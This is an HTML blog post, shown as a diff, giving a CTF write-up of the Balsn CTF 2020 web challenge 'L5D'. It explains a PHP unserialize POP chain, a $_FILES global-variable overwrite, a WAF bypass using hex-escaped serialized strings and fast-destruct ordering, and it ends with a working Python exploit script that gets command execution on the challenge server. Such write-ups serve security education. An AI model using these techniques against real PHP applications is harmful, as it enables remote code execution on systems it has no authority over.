@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+
+  <!-- PACE Progress Bar START -->
+  
+    
+<script src="https://raw.githubusercontent.com/HubSpot/pace/v1.0.2/pace.min.js"></script>
+
+    
+<link rel="stylesheet" href="https://github.com/HubSpot/pace/raw/master/themes/orange/pace-theme-flash.css">
+
+  
+  
+
+  <!-- PACE Progress Bar START -->
+
+  
+  <title>balsn ctf 2020 - l5d | RB&#39;s Page</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="CTFWebPHPDeserialization" />
+  
+  
+  
+  
+  <meta name="description" content="ChallengeL5D is another web challenge in our Balsn CTF 2020.  In this challenge, it combined multiple deserialization tricks.   Type: Web  Solved: 17  Author: kaibro   Description「Taking L5D was a pro">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Balsn CTF 2020 - L5D">
+<meta property="og:url" content="http://blog.rb363.tw/2020/12/04/Balsn-CTF-2020-L5D/index.html">
+<meta property="og:site_name" content="RB&#39;s Page">
+<meta property="og:description" content="ChallengeL5D is another web challenge in our Balsn CTF 2020.  In this challenge, it combined multiple deserialization tricks.   Type: Web  Solved: 17  Author: kaibro   Description「Taking L5D was a pro">
+<meta property="og:locale">
+<meta property="article:published_time" content="2020-12-04T08:53:37.000Z">
+<meta property="article:modified_time" content="2020-12-09T13:44:48.739Z">
+<meta property="article:author" content="RB363">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Deserialization">
+<meta name="twitter:card" content="summary">
+  
+  <link rel="icon" href="/css/images/favicon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="https://cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hack-font@3/build/web/hack.css">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="https://netdna.bootstrapcdn.com/bootstrap/3.0.2/css/bootstrap.min.css" >
+  <link rel="stylesheet" href="/css/hiero.css" >
+  <link rel="stylesheet" href="/css/glyphs.css" >
+  
+
+  <!-- Custom CSS -->
+  
+<link rel="stylesheet" href="/css/my.css">
+
+  <!-- Google Adsense -->
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<script>
+var themeMenus = {};
+
+  themeMenus["/"] = "Home"; 
+
+  themeMenus["/archives"] = "Archives"; 
+
+  themeMenus["/categories"] = "Categories"; 
+
+  themeMenus["/tags"] = "Tags"; 
+
+  themeMenus["/about"] = "About"; 
+
+</script>
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  <header id="allheader" class="site-header" role="banner">
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" title="RB&#39;s Page" rel="home"> RB&#39;s Page </a>
+            
+          </h1>
+
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+            <div class="clearfix sf-menu">
+
+              <ul id="main-nav" class="nmenu sf-js-enabled">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">Home</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/archives">Archives</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/categories">Categories</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/tags">Tags</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">About</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+
+      </div>
+  </div>
+</header>
+
+
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-Balsn-CTF-2020-L5D" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      Balsn CTF 2020 - L5D
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/2020/12/04/Balsn-CTF-2020-L5D/" class="article-date">
+	  <time datetime="2020-12-04T08:53:37.000Z" itemprop="datePublished">December 4, 2020</time>
+	</a>
+
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><p><code>L5D</code> is another web challenge in our Balsn CTF 2020. </p>
+<p>In this challenge, it combined multiple deserialization tricks. </p>
+<ul>
+<li>Type: Web </li>
+<li>Solved: 17 </li>
+<li>Author: kaibro </li>
+</ul>
+<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">「Taking L5D was a profound experience, one of the most important things in my life.」</span><br><span class="line">Try this new Unserialize-Oriented Programming System a.k.a. L5D ! </span><br><span class="line"></span><br><span class="line">PHP Version: 7.0.33</span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>In the website, the author puts the source code on <code>/?action=src</code>. 
+You can check the source code in <a target="_blank" rel="noopener" href="https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2020/src/index.php">here</a>. 
+From the source code, we can see several classes with <code>__wakeup</code> and <code>__destruct</code> functions. </p>
+<p>In additional, there is a <code>unserialize</code> function with a user-controllable input.</p>
+<p>Therefore, just as the description of this challenge, it is an &quot;Unserialize-Oriented Programming System&quot;. </p>
+<p>Some people call this exploitation as POP chain. (Property Oriented Programming chain) 
+As for how to utilize those classes (gadgets), we need to read it more carefully. </p>
+<h3 id="Deserialization-Gadget"><a href="#Deserialization-Gadget" class="headerlink" title="Deserialization Gadget"></a>Deserialization Gadget</h3><p>After scaning the gadagets, we can realize the function of each gadget. </p>
+<ul>
+<li><code>L5D_Command</code><ul>
+<li>This gadget can trigger <code>system</code> function when <code>$is_unser_finished</code> is true. </li>
+<li>Obviously, it is required to reach RCE. </li>
+</ul>
+</li>
+<li><code>L5D_ResetCMD</code><ul>
+<li>It can set global variable <code>$cmd</code> when <code>$_SESSION[&#39;name&#39;]</code> equals to <code>&quot;wubalubadubdub&quot;</code>. </li>
+<li>To reach arbitrarily code execution, this gadget is needed to replace the initial command (<code>whoami</code>). </li>
+</ul>
+</li>
+<li><code>L5D_Login</code><ul>
+<li>This one can set <code>$_SESSION[&#39;name&#39;]</code>  to <code>&quot;wubalubadubdub&quot;</code> if we can know the hash of <code>/flag</code>. </li>
+<li>It looks like helpful, however, it is unlikely to obtain the hash of <code>/flag</code>. </li>
+</ul>
+</li>
+<li><code>L5D_SayMyName</code><ul>
+<li>It just echoes the <code>$_SESSION[&#39;name&#39;]</code></li>
+<li>We can use this to check the result of deserialization during testing. </li>
+</ul>
+</li>
+<li><code>L5D_Upload</code><ul>
+<li>This gadget can set <code>$GLOBALS</code> if an image is successfully uploaded. </li>
+<li>Somehow we can use it to revise some global variables. </li>
+</ul>
+</li>
+</ul>
+<h3 id="Global-variables-overwrite"><a href="#Global-variables-overwrite" class="headerlink" title="Global variables overwrite"></a>Global variables overwrite</h3><p>In the <code>L5D_Upload</code>, it noticeworthy that part of the code seems vulerable. </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">	$GLOBALS[$key] = $value;</span><br></pre></td></tr></table></figure>
+
+<p>With that, we can overwrite all of the global variables. 
+However, after testing, we can only assign a value in specific structure. </p>
+<p>According to the PHP document, a <code>$_FILES</code> object is an array of file objects. 
+And each file object consists of name, type, tmp_name, error, and size attributes. </p>
+<p>For example, when I upload <code>l5d_file</code>, the <code>$_FILES</code> object would be like following: </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;l5d_file&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">array</span>(<span class="number">5</span>) &#123;</span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">13</span>) <span class="string">&quot;trippycat.gif&quot;</span></span><br><span class="line">    [<span class="string">&quot;type&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">19</span>) <span class="string">&quot;multipart/form-data&quot;</span></span><br><span class="line">    [<span class="string">&quot;tmp_name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">14</span>) <span class="string">&quot;/tmp/php4JsP9d&quot;</span></span><br><span class="line">    [<span class="string">&quot;error&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">int</span>(<span class="number">0</span>)</span><br><span class="line">    [<span class="string">&quot;size&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">int</span>(<span class="number">474785</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Thus, we can not rewrite the following useful variables to certain strings. </p>
+<ul>
+<li><code>$status</code></li>
+<li><code>$cmd</code></li>
+<li><code>$is_unser_finished</code></li>
+</ul>
+<p>Fortunately, we can control the <code>$_SESSION[&#39;name&#39;]</code> via uploading another file object called <code>_SESSION</code> and controlling the name attribute. 
+It means that we can try to set the command to execute.</p>
+<h3 id="WAF-Bypass"><a href="#WAF-Bypass" class="headerlink" title="WAF Bypass"></a>WAF Bypass</h3><p>To set protected attribute, it necessary to use <code>*</code>. </p>
+<p>After lots of searching, I find a trick can bypass this character in <a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc#ascii-strings">PHPGGC</a>. </p>
+<p>According to this document, we can replace <code>s</code> by <code>S</code> to assigned a string with hexadecimal ascii code. 
+That is to say, to represent <code>s:1:*</code>, we can simply use <code>S:1:\2A</code> to bypass the WAF.</p>
+<h3 id="Connect-Gadgets"><a href="#Connect-Gadgets" class="headerlink" title="Connect Gadgets"></a>Connect Gadgets</h3><p>To connect all the gadgets, we need to call and free each gadget in proper timing.</p>
+<p>From <a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc#fast-destruct">PHPGGC</a>, we can find another trick called &#39;fast destruct&#39;. 
+When user assign two values with same key in an array, the first one value would be destroyed automatically.</p>
+<p>Therefore, I can connect gadgets in arbitrary order by a crafted array.
+So I could trigger functions by the following sequence and reach RCE.</p>
+<ol>
+<li>call <code>L5D_ResetCMD</code></li>
+<li>call <code>L5D_Command</code> </li>
+<li>call <code>L5D_Upload</code> </li>
+<li>free <code>L5D_Upload</code> </li>
+<li>free <code>L5D_ResetCMD</code> </li>
+<li><code>L5D_Command</code> free by default</li>
+</ol>
+<p>Therefore, my exploitation script would be like below:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://l5d.balsnctf.com:12345&#x27;</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;_SESSION&#x27;</span>: (<span class="string">&#x27;wubalubadubdub&#x27;</span>,<span class="string">&quot;content&quot;</span>) , <span class="string">&#x27;l5d_file&#x27;</span>: (<span class="string">&#x27;trippycat.gif&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;trippycat.gif&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;multipart/form-data&#x27;</span>)&#125;</span><br><span class="line">des = <span class="string">&#x27;a:5:&#123;i:0;O:12:&quot;L5D_ResetCMD&quot;:1:&#123;S:10:&quot;\\00\\2A\\00new_cmd&quot;;s:%d:&quot;%s&quot;;&#125;i:1;O:11:&quot;L5D_Command&quot;:0:&#123;&#125;&#125;i:2;O:10:&quot;L5D_Upload&quot;:0:&#123;&#125;i:2;b:1;i:0;b:1;&#125;&#x27;</span> % (<span class="built_in">len</span>(cmd), cmd)</span><br><span class="line">print(des)</span><br><span class="line">url = url + <span class="string">&#x27;/?&amp;%3f=&#x27;</span> + des</span><br><span class="line"></span><br><span class="line">r = s.post(url, files=files)</span><br></pre></td></tr></table></figure>
+
+<p>Flag:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BALSN&#123;Link_5_Destruct__is_toooo_easy_for_you:D&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Founding-and-Trials"><a href="#Founding-and-Trials" class="headerlink" title="Founding and Trials"></a>Founding and Trials</h2><h3 id="Failed-Attempt-1-Error-hash"><a href="#Failed-Attempt-1-Error-hash" class="headerlink" title="Failed Attempt 1 - Error hash"></a>Failed Attempt 1 - Error hash</h3><p>At first, I tried to test the hash checking in <code>L5D_Login</code>. </p>
+<p>For some cases, if the reading occurs failure, it would returns <code>false</code>. 
+And the result of hash function could be expected.</p>
+<p>Yet, it is not the case here.</p>
+<h3 id="Failed-Attempt-2-Global-variables-overwrite"><a href="#Failed-Attempt-2-Global-variables-overwrite" class="headerlink" title="Failed Attempt 2 - Global variables overwrite"></a>Failed Attempt 2 - Global variables overwrite</h3><p>According to PHP documentation, we can control the <code>$_FILES</code> object by assigning a file name with<code>[]</code>. </p>
+<p>By this technique, we can control the depth and structure of the object. </p>
+<p>However, after testing, it is unlikely to control the variables like <code>$status</code> ,<code>$cmd</code>,  <code>$is_unser_finished</code> to our expected value.</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf">Utilizing Code Reuse Or Return Oriented Programming In PHP Application Exploits</a></li>
+<li><a target="_blank" rel="noopener" href="https://rayoflightz.github.io/writeup/web/2019/01/03/35c3-php-writeup.html">35c3c php challenge</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc#advanced-enhancements">PHPGGC - advanced enhancements</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/reserved.variables.files.php">$_FILES in PHP docs</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/CTF-writeup/">CTF-writeup</a>
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Deserialization/" rel="tag">Deserialization</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+
+      
+            
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2020/11/27/Balsn-CTF-2020-TPC/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Balsn CTF 2020 - TPC</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article" style="overflow-y: scroll; max-width: 28%;">
+    <strong class="toc-title">Contents</strong>
+    
+      <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Challenge"><span class="nav-number">1.</span> <span class="nav-text">Challenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Description"><span class="nav-number">2.</span> <span class="nav-text">Description</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution"><span class="nav-number">3.</span> <span class="nav-text">Solution</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Deserialization-Gadget"><span class="nav-number">3.1.</span> <span class="nav-text">Deserialization Gadget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Global-variables-overwrite"><span class="nav-number">3.2.</span> <span class="nav-text">Global variables overwrite</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WAF-Bypass"><span class="nav-number">3.3.</span> <span class="nav-text">WAF Bypass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Connect-Gadgets"><span class="nav-number">3.4.</span> <span class="nav-text">Connect Gadgets</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Founding-and-Trials"><span class="nav-number">4.</span> <span class="nav-text">Founding and Trials</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Failed-Attempt-1-Error-hash"><span class="nav-number">4.1.</span> <span class="nav-text">Failed Attempt 1 - Error hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Failed-Attempt-2-Global-variables-overwrite"><span class="nav-number">4.2.</span> <span class="nav-text">Failed Attempt 2 - Global variables overwrite</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference"><span class="nav-number">5.</span> <span class="nav-text">Reference</span></a></li></ol>
+    
+    </div>
+  </aside>
+</section>
+        
+      </div>
+      <footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      &copy; 2020 RB&#39;s Page All Rights Reserved.
+          
+      </div>
+      <div class="site-credit">
+        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hiero" target="_blank">hiero</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var contentdiv = document.getElementById("content");
+
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+</script>
+
+<!-- Custome JS -->
+
+<script src="/js/my.js"></script>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/categories" class="mobile-nav-link">Categories</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+
+  
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.css">
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/scripts.js"></script>
+
+
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script>
+</body>
+</html>
